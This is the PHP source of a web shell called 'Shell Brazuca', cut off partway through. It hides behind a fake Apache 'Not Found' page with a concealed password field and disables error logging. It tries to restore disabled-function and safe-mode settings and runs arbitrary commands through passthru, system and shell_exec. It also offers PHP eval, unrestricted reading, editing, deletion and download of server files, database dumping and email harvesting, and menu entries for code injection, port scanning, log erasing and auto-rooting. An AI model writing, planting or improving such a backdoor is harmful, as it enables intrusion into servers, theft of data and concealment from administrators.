<?php
error_reporting(FALSE);
set_time_limit(0);

/*******************************************************************************************************************
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~Seja bem-vindo a Shell Brazuca~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
********************************************************************************************************************
|                                             Codado por Eduardo                                                   |
|                                            twitter.com/@eduu4rd0                                                 |
|                                             github.com/eduu4rd0                                                  |
|                    Se você não sabe como o jabuti subiu na árvore, não tente tirálo de lá                        |
*******************************************************************************************************************/


/* Configurações da shell!  */

$login = "y"; /* Com a página de login ativada, você estara mantendo uma maior segurança sobre a shell  */
 $senha = "suasenha"; /* Defina aqui uma senha. */
$crawler = "n"; /* Deixando o crawler desativado, sua shell não sera "encontrada" por motores de busca */
$charset = "ISO-8859-1";
$cor_link1 = "Yellow";
$cor_link2 = "DarkYellow";
$sombra    = "Yellow";


/* Caso algum código abaixo seja alterado, o funcionamento da shell pode ser comprometido! */

$sep = DIRECTORY_SEPARATOR;
$n = "&nbsp;";
if(!empty($_GET["dir"])){ $diretorio = $_GET["dir"]; }else{ $diretorio = realpath(".").$sep; }
$software = $_SERVER["SERVER_SOFTWARE"];
$versaodophp = phpversion();
if(strpos("PHP/".$versaodophp, $software)){ $software .= " - PHP/".$versaodophp; }
$software = str_replace("PHP/".$versaodophp, "<a href=\"?id=3&dir=".$_GET["dir"]."\" >PHP/".$versaodophp."</a>", htmlspecialchars($software));

/* Área "ini" */
ini_restore("safe_mode_include_dir");
ini_restore("safe_mode_exec_dir");
ini_restore("disable_functions");
ini_restore("allow_url_fopen");
ini_restore("safe_mode");
ini_restore("open_basedir");
ini_set('error_log',NULL);
ini_set('log_errors',0);
ini_set('file_uploads',1);
ini_set('allow_url_fopen',1);
ini_set('max_execution_time',0);
ini_set('memory_limit','999999999M');
ini_set('default_charset', $charset);


/********************************************************************************************************************
********************************************** Autenticação *********************************************************/
if (strtolower($login)=="s" or strtolower($login)=="y" ){

if(isset($_POST["pass"])){
if($_POST["pass"] == $senha){ 
  setcookie($senha[2], $_POST["pass"], time()+3600);
 }
 header("Location: ".basename(__FILE__));
}
if(!empty($senha) and !isset($_COOKIE[$senha[2]]) or ($_COOKIE[$senha[2]] != $senha)){
 echo "<h1>Not Found</h1> 
<p>The requested URL was not found on this server.</p> 
<hr> 
<address>Apache Server at ".$_SERVER["HTTP_HOST"]." Port 80</address> 
    <style> 
        input { margin:0;background-color:#fff;border:1px solid #fff; } 
    </style> 
    <center> 
    <form method=post> 
    <input type=password name=pass> 
    </form></center> 
";
 die();
}
}else{
echo "<div style=\"position: top; width: 100%; bottom: 0px; background-color: Red;\"> 
<center>
<font size=\"2\" color=\"White\">Atencao: A tela de login esta desativada!</font>
</center>
</div>";
}

/********************************************************************************************************************
******************************************** Funções em Geral ******************************************************/

function OS() {
if(realpath(".")[1] == ":"){
return "Windows";
}else{
return "Linux/Unix";
}
}

function executar($string){ 
if(function_exists(passthru))  { $executou = passthru($string);   }else
if(function_exists(system))    { $executou = system($string);     }else
if(function_exists(shell_exec)){ $executou = shell_exec($string); }else{ $executou = "Error!"; }
 return $executou;
}

function tamanho($tamanho){
$padrao = 1024;
$unidades[0] = "B";
$unidades[1] = "KB";
$unidades[2] = "MB";
$unidades[3] = "GB";
$unidades[4] = "TB";
for ($i=0; $tamanho>$padrao; $i++){ $tamanho /= $padrao; }
return round($tamanho, 2)." ".$unidades[$i];
}

function hdd(){ 
 $livre = disk_free_space("/");
 $total = disk_total_space("/");
 $porcentagem = round(100/($total/$livre),2);
 if($livre > 0 and $total > 0)
 return "Free: ".tamanho($livre)." , Total: ".tamanho($total)." | ".$porcentagem."%";
}

function safe_mode(){ 
if (ini_get("safe_mode") == TRUE)
 return "<font color=\"Red\"><b>ON</b></font>";
else
 return "<font color=\"Lime\">OFF</font>"; 
}

function uname(){ 
 if(OS() == "Linux/Unix"){ 
  return "uname -a: <b><a href=\"http://google.com/search?q=".urlencode(executar("uname -a"))."\" target=\"_blank\" >".executar("uname -a")."</a></b>";
 }else{
  return "uname -a: <b><a href=\"http://google.com/search?q=".urlencode(php_uname())."\" target=\"_blank\" >".php_uname()."</a></b>"; }
}

function estaok($tipo, $dir, $ha) {
 
if($tipo == "upload"){
if(is_writable($dir)){  
$upload = " <a title=\"Available\" href=\"?id=6".dirlink($dir)."\">Upload</a> ";
if($ha == 1){ $upload = " <a title=\"Available\" href=\"?id=6".dirlink($dir)."\">UPLOAD</a> "; }
return $upload; 
}else{
 $upload = "<font title=\"Nao Available\" color=\"Red\">Upload</font> ";
 if($ha == 1){ $upload = "<font title=\"Not Available\" color=\"Red\">Upload</font> "; }
return $upload; 
} 
}

if($tipo == "criarArquivo"){
if(is_writable($dir)){  
$upload = "<a title=\"Available\" href=\"?id=11".dirlink($dir)."\">Make File</a>";
return $upload; 
}else{
 return "<font title=\"Not Available\" color=\"Red\">Make File</font>";
} 
}

if($tipo == "criarDiretorio"){
if(is_writable($dir)){  
$upload = "<a title=\"Available\" href=\"?id=10".dirlink($dir)."\">Make Dir</a>";
return $upload; 
}else{
 return "<font title=\"Not Available\" color=\"Red\">Make Dir</font>";
} 
}

if($tipo == "comando"){
if(function_exists(shell_exec) or function_exists(system) or function_exists(passthru)){
return "<a title=\"Available\" href=\"?id=2".dirlink($dir)."\">Execute Commands</a> | 
<a title=\"Available\" href=\"?id=7".dirlink($dir)."\">Commands List</a> | ";
}else{
return "<font title=\"Not Available\" color=\"Red\">Execute Commands</font> | 
<font title=\"Not Available\" color=\"Red\">Commands List</font> | ";
}

}

if($tipo == "sql"){
if(function_exists('mysql_connect') or ('mssql_connect') or function_exists('pg_connect')){ 
return "[ <a title=\"Available\" href=\"?id=9&op=dmpd".dirlink($dir)."\">Dump database</a> ] [ <a title=\"Available\" href=\"?id=9&op=ems".dirlink($dir)."\">email Search</a> ] [ <a title=\"Available\" href=\"?id=9&op=qe".dirlink($dir)."\">Query Execution</a> ]"; 
}else{
return "[ <font title=\"Not Available\" color=\"Red\">Dump database</a> ] [ <font title=\"Not Available\" color=\"Red\">email Search</a> ] [ <font title=\"Not Available\" color=\"Red\">Query Execution</a> ]"; 
}
}

}

function dirlink($dirURL){
$sep = DIRECTORY_SEPARATOR;
if (substr($dirURL,-1) != $sep) { $dirURL .= $sep; }
if(is_dir($dirURL)){ return "&dir=".$dirURL; }
}

function encurtador($arquivo){
if(strlen($arquivo) > 90){
$raliza_divisoria = ceil(90/2)-2;
return substr($arquivo, 0, $raliza_divisoria)."...".substr($arquivo, -$raliza_divisoria);
}else{ return $arquivo; }
}

function videoaudio($dir){
$sep = DIRECTORY_SEPARATOR;
$diretorio = explode("/", $_SERVER['DOCUMENT_ROOT']);
foreach($diretorio as $la){ $diretorio = $la; }
$diretorio = str_replace("\\",$sep,$diretorio);
if (substr($diretorio,-1) != $sep) { $diretorio .= $sep; }
$diretorio = str_replace("\\\\","\\",$diretorio);
$mostrado = $link = explode($sep,substr($diretorio,0,-1));
$i = 0;
foreach($mostrado as $b){ $linK = ""; $j = 0;
foreach ($link as $meio_link){ $linK.= $meio_link.$sep; if ($j == $i) {break;} $j++; }
$path_final = "\\".htmlspecialchars($b)."\\"; $i++; }
$url_site = $_SERVER["HTTP_HOST"];
$path_atual = $dir;
$yoo = explode($path_final, $path_atual);
foreach($yoo as $ooy){ $caminho_real = $ooy; }
if(strpos("http://", $url_site) == FALSE){ $url_site = "http://".$url_site."/"; }
$la = explode("\\", $caminho_real);
foreach($la as $al){ $ha .= $al."/"; } $caminho_real = $ha;
return $url_site.$caminho_real;
}

function addbarra($dir){
$sep = DIRECTORY_SEPARATOR;
if (substr($dir,-1) != $sep) { $dir .= $sep; }
}

/********************************************************************************************************************
********************************** Parte Gráfica / Index / Conserta URL ********************************************/

/***** PHP Info - Unica ferramenta que ficara fora do conjunto! *****/

if($_GET["id"] == 21){  /******** Files -> Download **********/
if(file_exists($_GET["pf"])){
header('Pragma: anytextexeptno-cache', true);
header('Content-type: application/force-download');
header('Content-Transfer-Encoding: Binary');
header('Content-length: '.filesize($_GET["pf"]));
header('Content-disposition: attachment; filename='.basename($_GET["pf"]));
readfile($_GET["pf"]);
exit;
}else{
 echo "<script>alert(\"Download failed or file dont exist\")</script>";
} 
}
if($_GET["id"] == 3){   /********** Link para "casa" *********/
echo "<center><a href=\"?id=14&dir=".$_GET["dir"]."\">Home</a></center>";
$info = phpinfo();
echo $info;
break;
}

/********************************************************************/

if($_GET["id"] == "" or $_GET["id"]>30 or !is_dir($_GET["dir"])){ echo "<script>window.location=\"?id=14&dir=".realpath(".").$sep."\";</script>"; header("Location: ".basename(__FILE__)."?id=14&dir=".realpath(".").$sep); } 
if($crawler != "n"){ echo "<meta name=\"robots\" content=\"NOFOLLOW,NOARCHIVE,NOINDEX\" />\n"; }
echo "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=".$charset."\">
<title>Shell Brazuca</title> 
<style type=\"text/css\">
body{
 FONT-FAMILY: Courier New;
 margin: 2;
 color: White;
 background-color: Black; 
}
textarea{
 width: 100%;
 height: 300px;
 background: Black;
 color: White;
 border: 1px solid Yellow;
 margin-left:0;
 margin-right:0;
}
select, input{
 background: Black;
 color: White;
 border: 1px solid Yellow;
}
input[type=\"submit\"]{
 background: Black;
 color: Grey;
 border: 1px solid Yellow;
}
a:link, a:visited {color:".$cor_link1."; TEXT-DECORATION: none;}
a:hover {color:".$cor_link2."; TEXT-DECORATION: none; text-shadow:0px 1px 8px ".$sombra."; }
</style>
<center><font size=\"6\">Shell Brazuca</font></center><hr width=\"500\" size=\"1\">
<font size=\"2\">Software: ".$software."<br>
".uname()."<br>
User: ".get_current_user()."<br>
Safe Mode: ".safe_mode()."<br>
".hdd()."<br>";
echo "<b><u>".substr(sprintf('%o', fileperms($_GET["dir"])), -4)."</b></u> - ";
$diretorio = str_replace("\\",$sep,$diretorio);
if (substr($diretorio,-1) != $sep) { $diretorio .= $sep; }
$diretorio = str_replace("\\\\","\\",$diretorio);
$mostrado = $link = explode($sep,substr($diretorio,0,-1));
$i = 0;
foreach($mostrado as $b){
$linK = ""; $j = 0;
foreach ($link as $meio_link){
$linK.= $meio_link.$sep;
if ($j == $i) {break;}
$j++;
}
echo "<a href=\"?id=14&dir=".$linK."\"><b>".htmlspecialchars($b)."</b></a>".$sep;
$i++;
}
if(OS() == "Windows"){
echo "<br>Drives: ";
$letras = range("A","Z");
$acertos = 0;
foreach($letras as $lD){ if(is_dir($lD.":\\")){ echo "[<a href=\"?id=14&dir=".$lD.":\\\"><b>".$lD."</b></a>] "; $acertos = 1;  } }
if($acertos == 0){ echo "<b>[ N/D ]</b>"; }
}
echo "<hr size=\"full\">
<center>
<a href=\"".basename(__FILE__)."?id=14".dirlink($_GET["dir"])."\">File Manager</a> | 
".estaok("upload", $_GET["dir"])."
| <a href=\"?id=8".dirlink($_GET["dir"])."\">Read (Mini-Bypass)</a> | 
".estaok("comando", $_GET["dir"])."
<a href=\"?id=4".dirlink($_GET["dir"])."\">Eval PHP</a> | 
<a href=\"?id=9".dirlink($_GET["dir"])."\">MySQL</a> | 
<a href=\"?id=12".dirlink($_GET["dir"])."\">Others</a> | 
<a href=\"?id=13".dirlink($_GET["dir"])."\">About</a> | 
<a href=\"?id=1\">Logout</a> | 
<a href=\"?id=0".dirlink($_GET["dir"])."\">Kill-Me</a> 
</center>
<hr size=\"full\">";

if($_GET["id"] == 14){
echo "<center><a href=\"?id=14&dir=".realpath(".").$sep."\">Home</a> | ".estaok("criarArquivo", $_GET["dir"])." | ".estaok("criarDiretorio", $_GET["dir"])."</center>";
}

/********************************************************************************************************************
********************************** Setor responsável pelas 'ferramentas' em sí *************************************/

if($_GET["id"] == 14){  /****** Gerenciador de Arquivos ******/
$arquivoN = 0; $pastas  = 0;
echo "<hr size=full>";
$path = $_GET["dir"];
$diretorio = dir($_GET["dir"]);
while($arquivo = $diretorio->read()){
$arq = $path.$arquivo;

if (!dir($arq)){ // Arquivos \\
 echo "<div style=\"position: top; width: 100%; font-size: 8pt; bottom: 0px; background-color: Black; border: 1px solid White;\"> 
 <a href=\"?id=15&dir=".$path."&pf=".$arq."&tipo=code\">";

$a = 0; $e = 0;
$arqui = pathinfo(strtolower(basename($arquivo)), PATHINFO_EXTENSION);

$arqIvo = array("cfg" ,"txt", "bat", "sys", "inf", "ini", "js", "htm", "html", "css", "php", "md", "sh", "pl", "py", "asp", "log", "csv");
foreach($arqIvo as $iconE){ if($arqui == $iconE)            { echo "<font face=\"wingdings\" size=\"4\"> 2  </font>"; $e = $e+1; }else{ $a = $a+1; } } 
$arqIvo = array("png", "jpg", "jpeg", "bmp", "gif", "ico");
foreach($arqIvo as $iconE){ if ($e==0){ if($arqui == $iconE){  echo "<font face=\"webdings\" size=\"4\">N   </font>"; $e = $e+1; }else{ $a = $a+1; } } }
$arqIvo = array("wma", "mp3", "mp4");
foreach($arqIvo as $iconE){ if ($e==0){ if($arqui == $iconE){  echo "<font face=\"webdings\" size=\"4\">W   </font>"; $e = $e+1; }else{ $a = $a+1; } } }
$arqIvo = array("zip");
foreach($arqIvo as $iconE){ if ($e==0){ if($arqui == $iconE){  echo "<font face=\"webdings\" size=\"4\">?   </font>"; $e = $e+1; }else{ $a = $a+1; } } }
if($a == 28 ){ echo "<font face=\"webdings\" size=\"4\">s   </font>"; }
 
if (is_writable($arq) == TRUE){ $gravavel = "<font size=\"2\" color=\"Green\" title=\"Writable\"> ".$n.$n."W</font>";
}else{ $gravavel = "<font size=\"2\" color=\"Red\" title=\"Not writable\">N.W</font>"; }
if (is_readable($arq) == TRUE){ $legivel = "<font size=\"2\" color=\"Green\" title=\"Readable\">R$n$n</font>"; 
}else{ $legivel = "<font size=\"2\" color=\"Red\" title=\"Not readable\">N.R</font>"; }
 
echo encurtador($arquivo)."</a>".$ext[$arquivo]."<table align=\"right\" height=\"0\" border=\"0\" ><tr><td>| <a href=\"?id=5&vf=".$arq."&dir=".$_GET["dir"]."\">+</a> | ".$gravavel."<font size=\"2\">/</font>".$legivel." | ";
   
   $perm = substr(sprintf('%o', fileperms($arq)), -4);
   
   if($perm<="0555"){
   $retornar = "<font size=\"2\" color=\"Red\">".$perm."</font>";
   if($perm == 0){ $retornar = "<font size=\"2\" color=\"Red\">$n$n$n".$perm."</font>"; }
   }else{
   $retornar = "<font size=\"2\" color=\"Green\">".$perm."</font>";
   }
   echo $retornar;
   
   $arquivoN = $arquivoN+1;
   echo " | <font size=\"2\" color=\"White\">";
   
   if(strlen(tamanho(filesize($arq))) == 3){
   echo "$n$n$n$n$n$n".tamanho(filesize($arq));   
   }else if(strlen(tamanho(filesize($arq))) == 4){
   echo "$n$n$n$n$n".tamanho(filesize($arq));
   }else if(strlen(tamanho(filesize($arq))) == 5){
   echo "$n$n$n$n".tamanho(filesize($arq));
   }else if(strlen(tamanho(filesize($arq))) == 6){
   echo "$n$n$n".tamanho(filesize($arq));   
   }else if(strlen(tamanho(filesize($arq))) == 7){
   echo "$n$n".tamanho(filesize($arq));   
   }else if(strlen(tamanho(filesize($arq))) == 8){
   echo "$n".tamanho(filesize($arq));    
   }else{ echo tamanho(filesize($arq)); }   
   
   echo "</font> | <font size=\"2\"><a href=\"?id=18&rn=".$arq."&dir=".$_GET["dir"]."\">RENAME</a> \ 
   <a href=\"?id=16&pf=".$arq.dirlink($_GET["dir"])."\" >DELETE</a> \ <a href=\"?id=21&pf=".$arq.dirlink($_GET["dir"])."&t=1\">DOWNLOAD</a>
   </font></table></tr></td></div><br>";
  
  
  
}else{  // Diretórios \\
 if (is_writable($arq) == TRUE){ $gravavel = "|<font size=\"2\" color=\"Green\" title=\"Writable\"> ".$n.$n."W</font>";
}else{ $gravavel = "|<font size=\"2\" color=\"Red\" title=\"Not writable\"> N.W</font>"; }
if (is_readable($arq) == TRUE){ $legivel = "<font size=\"2\" color=\"Green\" title=\"Readable\">R$n$n</font>"; 
}else{ $legivel = "<font size=\"2\"color=\"Red\" title=\"Not readable\">N.R</font>"; }
 echo "<div style=\"position: top; width: 100%; font-size: 8pt; bottom: 0px; background-color: Black; border: 1px solid White;\">
 <a href=\"?id=14&dir=".$arq.$sep."\" ><font face=\"Wingdings\" size=\"4\">1</font> <font color=\"White\">".$sep."</font>".$arquivo."<font color=\"White\">".$sep."</font></a> 
 <table align=\"right\" height=\"0\" border=\"0\" ><tr><td>|  + ".$gravavel."<font size=\"2\">/</font>".$legivel." | ";
   
   $perm = substr(sprintf('%o', fileperms($arq)), -4);
   if($perm=="0666"){
   $retornar = "<font size=\"2\" color=\"Red\">".$perm."</font>";
   }else{
   $retornar = "<font size=\"2\" color=\"Green\">".$perm."</font>";
   }
   echo $retornar;
   
   if($arquivo == "." or $arquivo == ".."){
   echo " | <font size=\"2\" color=\"White\">$n$n$n$n LINK</font> | <font size=\"2\">----- \ ------- \ --------</font></table></tr></td></div><br>";
   }else{   
   echo " | <font size=\"2\" color=\"White\">$n$n$n$n$n DIR </font> | <font size=\"2\"><a href=\"?id=18&rn=".$arq."&dir=".$_GET["dir"]."\">RENAME</a> \ <a href=\"?id=17&dt=".$arq."\&dir=".$_GET["dir"]."\">DELETE</a> \ ".estaok("upload", $arq, 1)." $n</font></table></tr></td></div><br>";
   $pastas = $pastas+1;
   } 
}
}
$diretorio->close();
echo "<center>".$arquivoN." Files | ".$pastas." Folders</center>";
}

if($_GET["id"] == 15){  /********* Files -> Editar ***********/
if (strlen($_GET["pf"])>1){
echo "<form action=\"\" method=\"POST\">
Name: <font size=\"4\" color=\"White\">".encurtador(htmlspecialchars(basename($_GET["pf"])))."</font><br>
Path: <font size=\"4\" color=\"White\">".$_GET["dir"]."</font><br>
Size: <font color=\"White\">".tamanho(filesize($_GET["pf"]))."</font> // 
Perm: <font color=\"White\">".substr(sprintf('%o', fileperms($_GET["pf"])), -4)."</font> // ";
if(is_writable($_GET["pf"])){ echo "Writable: <font color=\"Green\">Yes</font> // "; }else{ echo "Writable: <font color=\"Red\">Not</font> // "; }
if(is_readable($_GET["pf"])){ echo "Readable: <font color=\"Green\">Yes</font>";        }else{ echo "Readable: <font color=\"Red\">Not</font>"; }
if(isset($_GET["pf"]))      { echo " // <a href=\"?id=14&dir=".$_GET["dir"]."\" >Go Back</a><br>"; }
echo "<hr size=\"full\">";
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
$base = pathinfo(strtolower($_GET["pf"]), PATHINFO_EXTENSION); // Arquivo que dara a extenção do arquivo
$codigo = 0;

$formato = "";
$ext_audiovideo = array("mp4", "avi", "flv", "mp3", "wma");
foreach($ext_audiovideo as $ext){ if($base == $ext){ $formato = "AudioVideo";     $codigo .= +1; } }
$ext_imagens    = array("png", "jpg", "gif", "ico", "bmp");
foreach($ext_imagens    as $ext){ if($base == $ext){ $formato = "imagem"; $codigo .= +1; } }
if($base == "zip")                                 { $formato = "zip";        $codigo .= +1; }
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/* AUDIO VIDEO */
if($formato == "AudioVideo"){
echo "<center><embed src=\"".videoaudio(htmlspecialchars($_GET["dir"])).basename($_GET["pf"])."\" autostart=\"true\" loop=\"true\" height=\"50%\" width=\"50%\" ></center>"; 
die;
}

/*     ZIP    */
if($formato == "zip"){
echo "Descompacting ".$base." ...<br>";

if(mkdir($_GET["dir"]."uncompressed") == FALSE){ die("Error! Could not create the directory!"); }

$zip = new ZipArchive;
$zip->open($_GET["pf"]);
if($zip->extractTo($_GET["dir"]."uncompressed") == TRUE){
echo "Successfully unzipped file!";
echo "<META HTTP-EQUIV=Refresh CONTENT=\"3; URL=?id=14&dir=".$_GET["dir"]."uncompressed".$sep."\">";
header("Location: ".basename(__FILE__)."?id=14&dir=".$_GET["dir"]."uncompressed".$sep);
}else{
echo "The file can not be unpacked!";
}
$zip->close();
break;
}

/*   IMAGENS  */
if($formato == "imagem"){
$tamanho = $_POST["tamanho"];
echo "<form action=\"\" method=\"POST\">Size: <select name=\"tamanho\" >";
if($tamanho == ""){ echo "<option value=\"50%\">50%</option>"; $tamanho = "50%";
}else{ echo "<option value=\"".$tamanho."\">".$tamanho."</option>"; }
echo "<option value=\"----\">----</option>
<option value=\"100%\">100%</option>
<option value=\"90%\">90%</option>
<option value=\"70%\">70%</option>
<option value=\"50%\">50%</option>
<option value=\"30%\">30%</option>
<option value=\"10%\">10%</option>
</select>
<input type=\"submit\" value=\"Trocar\">
</form><hr size=\"full\">";

$handle = fopen($_GET["pf"], "r");
$imgbinary = fread(fopen($_GET["pf"], "r"), filesize($_GET["pf"]));
echo "<center><div style=\"width: full; background-color: #D3D3D3\"><img width=\"".$tamanho."\" height=\"".$tamanho."\" src=\"data:image/".$tipo.";base64,".base64_encode($imgbinary)."\" alt=\"imagem\" /></div><br><br></center>";
}

/*   CODIGO   */
if($codigo == 0){
echo "<center>[ <a href=\"?id=15&dir=".$_GET["dir"]."&pf=".$_GET["pf"]."&tipo=code\">View Source</a> ] [ <a href=\"?id=15&dir=".$_GET["dir"]."&pf=".$_GET["pf"]."&tipo=edit\">Edit Source</a> ] <hr size=\"full\"></center>";

if($_GET["tipo"] == "code"){   // CODIGO
echo "<div style=\"width: full; background-color: #D3D3D3\">";
echo highlight_file(htmlspecialchars($_GET["pf"])) or die("<font color=\"black\">Error!</font>");
echo "</div>";
}

if($_GET["tipo"] == "edit"){   // CODIGO / Edição
$conteudo = htmlspecialchars(file_get_contents($_GET["pf"])) or die("<font color=\"black\">Error!</font>");
echo "
<textarea name=\"NovoConteudo\" rows=\"15\" cols=\"100\" name=\"editar\">".$conteudo."</textarea><br>
<input name=\"save\" type=\"submit\" value=\"Save\"> <input name=\"delete\" type=\"submit\" value=\"Delete\"></form>";
}

if(isset($_POST["save"])){     // Salvar
$nome = $_GET["pf"];
$editado = $_POST["NovoConteudo"];
$fp = fopen($nome, "w") or die("Error!");
$escreve = fwrite($fp, $editado );
fclose($fp);
echo "<font size=\"5\">Sucess!</font>";
header("Location: ".basename(__FILE__)."?id=15&dir=".$_GET["dir"]."&pf=".$_GET["pf"]."&type=code");
echo "<META HTTP-EQUIV=Refresh CONTENT=\"3; URL=?id=15&dir=".$_GET["dir"]."&pf=".$_GET["pf"]."&type=code\">";
}

if(isset($_POST["delete"])){   // Deletar
if(unlink($_GET["pf"])){
echo "<font size=\"5\">File as been deleted!</font>";
}else{
echo "<font size=\"5\">Error!</font>";
}
header("Location: ".basename(__FILE__)."?id=14&dir=".$_GET["dir"]);
echo "<META HTTP-EQUIV=Refresh CONTENT=\"3; URL=?id=14&dir=".$_GET["dir"]."\">";
}

}

}
}

if($_GET["id"] == 17){  /******** Deletar Diretório **********/
 if(rmdir(addbarra($_GET["dt"])) == TRUE){ echo "<font size=\"5\">Sucess!</font>"; }else{ echo "<font size=\"5\">Error!</font>"; } 
header("Location: ".basename(__FILE__)."?id=14".dirlink($_GET["dir"]));
echo "<META HTTP-EQUIV=Refresh CONTENT=\"3; URL=?id=14".dirlink($_GET["dir"])."\">";
}

if($_GET["id"] == 16){  /********* Deletar Arquivo ***********/
if(unlink($_GET["pf"]) == TRUE){
echo "<fonnt size=\"5\">Sucess!</font>"; }else{ echo "<fonnt size=\"5\">Error!</font>"; }
header("Location: ".basename(__FILE__)."?id=14".dirlink($_GET["dir"]));
echo "<META HTTP-EQUIV=Refresh CONTENT=\"3; URL=?id=14".dirlink($_GET["dir"])."\">";
}

if($_GET["id"] == 18){  /********* Files -> Renomear *********/
echo "<font size=\"5\"><center>- Rename Files -</center></font><hr size=\"full\"><br>
<form action=\"\" method=\"POST\">
<font size=\"4\">Name: </font><font color=\"White\" size=\"4\">";
if(strlen(basename($_GET["rn"])) > 100){ echo "<font size=\"2\">".basename($_GET["rn"])."</font>"; }else{ echo basename($_GET["rn"]); }
echo "</font><br>
<font size=\"4\">New name: </font><input size=\"50\" type=\"text\" name=\"nomeN\" value=\"".$_POST["nomeN"]."\" >
<input name=\"renomear\" type=\"submit\" value=\"Rename\">
</form>";
if($_POST["renomear"]){
$NovoNome = $_GET["dir"].$_POST["nomeN"];
 if(rename($_GET["rn"],$NovoNome)){
  echo "<font size=\"5\">Sucess!</font>";
 }else{
  echo "<font size=\"5\">Error!</font>";
 } 
header("Location: ".basename(__FILE__)."?id=14&dir=".$_GET["dir"]);  
echo "<META HTTP-EQUIV=Refresh CONTENT=\"3; URL=?id=14&dir=".$_GET["dir"]."\">";
}
}

if($_GET["id"] == 10){  /****** Files -> Criar diretório *****/
echo "<font size=\"5\"><center>- Make Dir -</center></font><hr size=full><br>
<form action=\"\" method=\"POST\">
<font size=\"4\">Meke in: <input size=\"70\" type=\"text\" name=\"dirforcrate\" value=\"".$_GET["dir"]."\" ><br>
Name for new dir: </font><input size=\"50\" type=\"text\" name=\"dirname\" value=\""; 
if(strlen($_POST["dirname"])>1){ echo $_POST["dirname"]; }
echo "\"> 
<input type=\"submit\" name=\"make\" value=\"Make\">
</form>";

if($_POST["make"]){
  if(mkdir($_POST["dirforcrate"].$_POST["dirname"])){
  echo "<font size=\"5\">Sucess!</font>";
}else{
  echo "<font size=\"5\">Error!</font>";
  
}
header("Location: ".basename(__FILE__)."?id=14&dir=".$_GET["dir"]);
echo "<META HTTP-EQUIV=Refresh CONTENT=\"3; URL=?id=14&dir=".$_GET["dir"]."\">";
}

}

if($_GET["id"] == 11){  /******* Files -> Criar Arquivos *****/
echo "<font size=\"5\"><center>- Make Files -</center></font><hr size=full><br>
<form action=\"\" method=\"POST\" >
<font size=\"4\">Name to file: </font><input size=\"50\" type=\"text\" name=\"nomeArquivo\" value=\"";
if(strlen($_POST["nomeArquivo"])>1){ echo $_POST["nomeArquivo"]; }else{ echo "arquivo.txt"; }echo "\"><br>
<font size=\"4\">Dir for make file: </font><input size=\"50\" type=\"text\" name=\"dir\" value=\""; if($_GET["dir"] != realpath(".").$sep){ echo $_GET["dir"]; }else{ echo realpath(".").$sep; } echo "\"><br>
<font size=\"4\">Content: <br></font><textarea cols=\"100\" rows=\"10\" name=\"conteudoArquivo\"></textarea>
<input align=\"right\" type=\"submit\" value=\"Make\">
</form>";


if (strlen($_POST["nomeArquivo"])>0){
$conteudo = $_POST["conteudoArquivo"];
if(strlen($conteudo) == 0){ die("<script>alert(\"The file must contain at least one character!\");</script>"); }
$criar = $_POST["dir"];
$retorno = fopen($criar.$_POST["nomeArquivo"], "w") or die("<script>alert(\"Error creating file!\");</script>");
$escreve = fwrite($retorno, $conteudo ) or die("<script>alert(\"Error inserting content in the file!\");</script>");
fclose($retorno);
header("Location: ".basename(__FILE__)."?id=14&dir=".$_GET["dir"]);  
echo "<META HTTP-EQUIV=Refresh CONTENT=\"3; URL=?id=14&dir=".$_GET["dir"]."\">";
}
}

if($_GET["id"] == 12){  /*************** Outros **************/

if(empty($_GET["outros"]) or  !isset($_GET["outros"])){ /* Menu */
echo "<font size=\"5\"><center>- Others -</center></font><hr size=full><br>
<center>
[ <a href=\"?id=12&outros=1".dirlink($_GET["dir"])."\">More info</a> ] 
[ <a href=\"?id=12&outros=2".dirlink($_GET["dir"])."\">Code injector</a> ] 
[ <a href=\"?id=12&outros=3".dirlink($_GET["dir"])."\">Port Scan</a> ] 
[ <a href=\"?id=12&outros=4".dirlink($_GET["dir"])."\">Encript String</a> ] "; 
if(OS() == "Linux/Unix"){ echo"[ <a href=\"?id=12&outros=5".dirlink($_GET["dir"])."\">Log Eraser</a> ] "; } echo "<br>
[ <a href=\"?id=12&outros=6".dirlink($_GET["dir"])."\">Auto Rooter</a> ] 
</center>
";
}


if($_GET["outros"] == 1){ /* Infos Extras   */
echo "<font size=\"5\"><center>- More Info -</center></font><hr size=\"full\"><br>";
echo "Server IP: <b><font color=\"White\"><a href=\"http://whois.domaintools.com/".$_SERVER["SERVER_ADDR"]."\" target=\"_blank\">".$_SERVER["SERVER_ADDR"]."</a></b></font> | Your IP: "; 
if (getenv(HTTP_X_FORWARDED_FOR)){ echo "<font color=\"White\"><b>".getenv(HTTP_X_FORWARDED_FOR)."</b></font><br>"; }else
if(getenv(HTTP_CLIENT_IP)){ echo "<font color=\"White\"><b>".getenv(HTTP_CLIENT_IP)."</b></font><br>"; }else{ 
echo "<font color=\"White\"><b>".getenv(REMOTE_ADDR)."</b></font><br>"; }
echo "System: "; if ($os==0){ echo "<font color=\"White\"><b>Windows</b></font><br>"; }elseif($os==1){ echo "<font color=\"white\"><b>Linux</b></font><br>"; }
echo "User: <b><font color=\"White\">" .get_current_user()."</b></font><br>";
echo "Page: <b><font color=\"White\">".$_SERVER['SCRIPT_NAME']."</font></b><br>";
echo "Server name: <b><font color=\"White\">".$_SERVER["HTTP_HOST"]."</font></b><br>";
echo "Server admin: <b><font color=\"White\">".$_SERVER["SERVER_ADMIN"]."</font></b><br>";
if(function_exists("mysql_connect")){ echo "MySQL: <font color=\"Green\"><b>ON</b></font>"; }else{ echo "MySQL: <font color=\"Red\"><b>OFF</b></font>"; } 
if(strlen(mysql_get_server_info())>0){ echo " -> MySQL Version: <font color=\"White\"><b>".mysql_get_server_info()."</b></font><br>"; }else{ echo "<br>"; }
if (function_exists("sqlite_open")){ echo "SQL Lite: <b><font color=\"Green\">ON</font></b><br>"; }else{ echo "SQL Lite: <b><font color=\"Red\">OFF</font></b><br>"; }
if(function_exists("mssql_connect")){ echo "MsSQL: <b><font color=\"Green\">ON</font></b><br>"; }else{ echo "MsSQL: <b><font color=\"Red\">OFF</font></b><br>"; }
if(function_exists("ocilogon")){ echo "Oracle: <b><font color=\"Green\">ON</font></b><br>"; }else{ echo "Oracle: <b><font color=\"Red\">OFF</font></b><br>"; }
